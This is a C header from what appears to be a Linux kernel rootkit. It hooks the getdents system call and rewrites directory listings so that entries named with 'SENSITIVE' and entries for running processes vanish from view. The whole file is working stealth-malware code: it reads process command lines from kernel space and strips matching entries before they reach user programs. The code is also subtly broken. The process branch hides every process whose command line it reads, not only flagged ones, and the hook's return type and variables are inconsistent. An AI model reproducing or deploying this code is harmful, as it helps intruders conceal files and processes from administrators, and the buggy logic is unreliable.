#ifndef GETDENTS_HOOK_H
#define GETDENTS_HOOK_H
// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/mm.h>           // for mm_struct, get_task_mm(), mmput()
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo: add include protection in header
// Removed: #include "getdents_hook.h"

// (Place your inline functions and static functions here)
static inline bool is_numeric(const char *str)
{
    int i;
    if (!str || !str[0])
        return false;
    for (i = 0; str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9')
            return false;
    }
    return true;
}

static char *read_cmdline_from_task(pid_t pid, size_t *out_size)
{
    struct task_struct *task;
    struct mm_struct *mm;
    char *buffer;
    size_t size;
    ssize_t nread;

    /* Locate the target process */
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        return NULL;
    }
    mm = get_task_mm(task);
    rcu_read_unlock();
    if (!mm)
        return NULL;

    /* Lock the mm using mmap_lock (replacing deprecated mmap_sem) */
    down_read(&mm->mmap_lock);
    size = mm->arg_end - mm->arg_start;
    up_read(&mm->mmap_lock);

    /* Allocate a buffer (extra byte for null termination) */
    buffer = kmalloc(size + 1, GFP_KERNEL);
    if (!buffer) {
        mmput(mm);
        return NULL;
    }

    /* Read the process's cmdline from memory */
    nread = access_process_vm(task, mm->arg_start, buffer, size, 0);
    mmput(mm);
    if (nread < 0 || nread != size) {
        kfree(buffer);
        return NULL;
    }
    buffer[size] = '\0';
    if (out_size)
        *out_size = size;
    return buffer;
}

static asmlinkage long (*orig_getdents)(const struct pt_regs*);

asmlinkage int hook_getdents(const struct pt_regs* regs)
{
    long ret; // total bytes returned by getdents
    unsigned long offset = 0;
    unsigned long bytes_left;
    struct linux_dirent64 *d, *kdirent, *kdirent_orig;
    char *dirp = (char *)regs->si;
    ret = orig_getdents(regs);

    long orig_ret = ret;
    if (ret <= 0)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    kdirent_orig = kmalloc(ret, GFP_KERNEL);
    if (!kdirent_orig) {
        kfree(kdirent);
        return ret;
    }

    if (copy_from_user(kdirent, dirp, ret)) {
        kfree(kdirent);
        kfree(kdirent_orig);
        return ret;
    }
    memcpy(kdirent_orig, kdirent, ret);

    bytes_left = ret;
    while (bytes_left > 0) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        size_t tmp = d->d_reclen;
        if (strstr(d->d_name, "SENSITIVE")) {
            memmove(d, (char *)d + tmp, bytes_left - tmp);
            ret -= tmp;
            bytes_left -= tmp;
            continue;
        } else if (is_numeric(d->d_name)) {
            int pid;
            if (kstrtoint(d->d_name, 10, &pid) == 0) {
                char *cmdline;
                size_t cmd_size;
                cmdline = read_cmdline_from_task(pid, &cmd_size);
                if (cmdline) {
                    size_t i;
                    for (i = 0; i < cmd_size; i++) {
                        if (cmdline[i] == '\0')
                            cmdline[i] = ' ';
                    }
                    if (strstr(cmdline, "SENSITIVE"))
                        pr_info("detected %s", cmdline);
                    kfree(cmdline);
                    memmove(d, (char *)d + tmp, bytes_left - tmp);
                    ret -= tmp;
                    bytes_left -= tmp;
                    continue;
                    
                }
            }
        }
        offset += d->d_reclen;
        bytes_left -= d->d_reclen;
        pr_info("hello from %s\n", d->d_name);
    }

    if (copy_to_user(dirp, kdirent, ret)) {
        copy_to_user(dirp, kdirent_orig, ret);
        kfree(kdirent_orig);
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent_orig);
    kfree(kdirent);
    return ret;
}

#endif // GETDENTS_HOOK_H

